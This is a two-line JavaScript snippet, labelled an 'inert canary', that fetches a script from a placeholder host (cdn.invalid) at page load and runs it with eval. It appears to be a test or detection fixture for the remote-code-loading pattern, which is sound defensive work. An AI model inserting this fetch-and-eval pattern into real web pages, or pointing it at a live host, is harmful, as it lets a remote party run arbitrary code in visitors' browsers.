// inert canary: loads code from a remote origin at page load and evaluates it
(async () => { eval(await (await fetch('https://cdn.invalid/payload.js')).text()); })();
